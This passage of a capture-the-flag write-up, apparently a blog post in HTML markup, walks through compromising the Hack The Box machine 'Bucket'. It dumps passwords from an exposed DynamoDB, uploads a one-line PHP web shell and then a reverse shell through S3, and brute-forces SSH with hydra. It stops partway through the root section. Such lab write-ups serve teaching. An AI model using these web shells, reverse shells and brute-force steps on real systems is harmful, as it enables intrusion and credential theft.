&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;awscli &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;aws configure &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb                                                                         
AWS Access Key ID &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;None]: dummy
AWS Secret Access Key &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;None]: dummy
Default region name &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;None]: us-east-1
Default output format &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;None]:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Reading about &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;awscli&lt;/code&gt; for DynamoDB, ran some simple queries to list tables and their existing entries, as below, where I was able to get some username and passwords that could be useful later.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;aws dynamodb list-tables &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--output&lt;/span&gt; json
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;s2&quot;&gt;&quot;TableNames&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;users&quot;&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;aws dynamodb scan &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--table-name&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--output&lt;/span&gt; json
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;s2&quot;&gt;&quot;Items&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;S&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;Management@#1@#&quot;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
      &lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;S&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;Mgmt&quot;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;S&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;Welcome123!&quot;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
      &lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;S&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;Cloudadm&quot;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;S&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;n2vM-&amp;lt;_K_Q:.Aa2&quot;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
      &lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;S&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;Sysadm&quot;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,
  &lt;span class=&quot;s2&quot;&gt;&quot;Count&quot;&lt;/span&gt;: 3,
  &lt;span class=&quot;s2&quot;&gt;&quot;ScannedCount&quot;&lt;/span&gt;: 3,
  &lt;span class=&quot;s2&quot;&gt;&quot;ConsumedCapacity&quot;&lt;/span&gt;: null
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we know that we also have a &lt;strong&gt;s3&lt;/strong&gt; running, enumerated some information about existing containers and blobs, where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adserver&lt;/code&gt; was found (where we already knew due to the URL of the images listed) and confirmed what else is hosted in this bucket.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;aws s3 &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb
2021-02-26 11:48:02 adserver

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;aws s3 &lt;span class=&quot;nb&quot;&gt;ls &lt;/span&gt;s3://adserver &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb
                           PRE images/
2021-02-26 11:50:04       5344 index.html

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;aws s3 &lt;span class=&quot;nb&quot;&gt;ls &lt;/span&gt;s3://adserver/images/ &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb
2021-02-26 11:52:02      37840 bug.jpg
2021-02-26 11:52:02      51485 cloud.png
2021-02-26 11:52:02      16486 malware.png
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h2&gt;

&lt;p&gt;Once we have access to the s3 bucket and know which contents are available and how to use them, the first thing to do is to upload a reverse shell payload to the website and then proceed with enumeration. To keep things simple, I’ll use the following php web shell:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After creating the file, uploaded it to bucket using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;awscli&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;aws s3 &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; ./exploit.php s3://adserver/ &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb
upload: ./exploit.php to s3://adserver/exploit.php                

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;aws s3 &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb &lt;span class=&quot;nb&quot;&gt;ls &lt;/span&gt;s3://adserver/              
                           PRE images/
2021-02-26 11:56:28         31 exploit.php
2021-02-26 11:56:02       5344 index.html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After trying to access it a few seconds later, noticed that the file was removed by another process. To circumvent this, made the execution call right after the upload command, running the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt;, where I was able to confirm that this approach worked.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;aws s3 &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; ./exploit.php s3://adserver/ &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://bucket.htb/exploit.php?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;upload: ./exploit.php to s3://adserver/exploit.php                
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To get a reverse shell, replaced the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit.php&lt;/code&gt; by &lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell&quot;&gt;pentestmonkey/php-reverse-shell (github.com)&lt;/a&gt; that after modifying it starts automatically to the listener previously defined, without the need of parameters in the payload, which resulted in success after a few attempts.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aws s3 &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; ./exploit.php s3://adserver/ &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://bucket.htb/exploit.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;user-flag&quot;&gt;User flag&lt;/h2&gt;

&lt;p&gt;Now with a reverse shell ot the machine, ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; to make it easier the enumeration, where the following points were identified:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Local user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roy&lt;/code&gt; has console access and, enumerating his home directory found the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; and folder &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;project&lt;/code&gt;, access to both denied using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt; credentials.&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;This user has no running processes that could allow us to hijack them so we would need to obtain his credentials to proceed with this machine.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Other services are running in this box, listening in ports 4566, 8000 and 38443, which could be used to escalate privileges later.&lt;/p&gt;

    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] Active Ports                                                                                         
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                               
Active Internet connections (servers and established)                                                     
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name         
tcp        0      0 127.0.0.1:38443         0.0.0.0:*               LISTEN      -                        
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                         
tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -                         
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                         
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                     
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;This box has also containers in execution (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctr&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runc&lt;/code&gt;), probably from localstack, being also a possibility when checking for privesc paths.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;There’s a directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/bucket-app&lt;/code&gt; that could be used by one of the apps previously identified, but also don’t allows us to read it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt; credentials.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;From the points discussed, what called more attention to me was the other services, so started by checking apache configurations (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/apache2/sites-enabled&lt;/code&gt;) where we had the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;000-default.conf&lt;/code&gt; listed below, but nothing about 38443, but was able to get insights about 4566 and 8000, which published the content from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/bucket-app&lt;/code&gt; folder.&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;VirtualHost&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; 127.0.0.1:8000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;IfModule&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; mpm_itk_module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;        AssignUserId root root
    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;IfModule&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;DocumentRoot&lt;/span&gt; /var/www/bucket-app
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;VirtualHost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;VirtualHost&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; *:80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;DocumentRoot&lt;/span&gt; /var/www/html
    &lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_HOST} !^bucket.htb$
    &lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; /.* http://bucket.htb/ [R]
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;VirtualHost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;VirtualHost&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; *:80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;ProxyPreserveHost&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;on&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;ProxyPass&lt;/span&gt; / http://localhost:4566/
    &lt;span class=&quot;nc&quot;&gt;ProxyPassReverse&lt;/span&gt; / http://localhost:4566/
    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Proxy&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; *&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;        &lt;span class=&quot;nc&quot;&gt;Order&lt;/span&gt; deny,allow
        &lt;span class=&quot;nc&quot;&gt;Allow&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Proxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;ServerAdmin&lt;/span&gt; webmaster@localhost
    &lt;span class=&quot;nc&quot;&gt;ServerName&lt;/span&gt; s3.bucket.htb

    &lt;span class=&quot;nc&quot;&gt;ErrorLog&lt;/span&gt; ${APACHE_LOG_DIR}/error.log
    &lt;span class=&quot;nc&quot;&gt;CustomLog&lt;/span&gt; ${APACHE_LOG_DIR}/access.log combined

&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;VirtualHost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Besides able to connect to this service locally, we’ll need some credentials to tunnel some communication via SSH and properly enumerate this service.&lt;/p&gt;

&lt;p&gt;Once this website had nothing interesting, decided to test the passwords previously collected in DynamoDB for user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roy&lt;/code&gt; and luckily we had success. Below the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hydra&lt;/code&gt; execution which automated this SSH Brute Force.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hydra &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; roy &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; passwords 10.10.10.212 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 4 ssh
Hydra v9.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2020 by van Hauser/THC &amp;amp; David Maciejak - Please &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;not use &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;military or secret service organizations, or &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;illegal purposes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;this is non-binding, these &lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; ignore laws and ethics anyway&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/vanhauser-thc/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting at 2021-02-26 12:55:36
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;l:1/p:3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, ~1 try per task
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] attacking ssh://10.10.10.212:22/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22][ssh] host: 10.10.10.212   login: roy   password: n2vM-&amp;lt;_K_Q:.Aa2
1 of 1 target successfully completed, 1 valid password found
Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/vanhauser-thc/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; finished at 2021-02-26 12:55:40
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once we have access to the machine as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roy&lt;/code&gt;, collected the user flag:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roy@bucket:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;roy&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;roy&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;roy&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sysadm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
roy@bucket:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt 
&amp;lt;redacted&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root flag&lt;/h2&gt;

&lt;p&gt;Now as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roy&lt;/code&gt;, was able to check the contents of both &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;project&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/bucket-app&lt;/code&gt; folders, which were very similar between each other. To inspect the contents better, made a copy of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/bucket-app&lt;/code&gt; for analysis.&lt;/p&gt;

&lt;p&gt;Checking the contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php&lt;/code&gt; we have something very interesting: a hidden function which generates a PDF file with the rendered content of a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ransomware&lt;/code&gt; alert in DynamoDB if a POST request is made with the body contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;action=get_alerts&lt;/code&gt;, storing it in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/bucket-app/files/&lt;/code&gt; folder.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'vendor/autoload.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Aws\DynamoDb\DynamoDbClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;REQUEST_METHOD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;action&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;get_alerts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
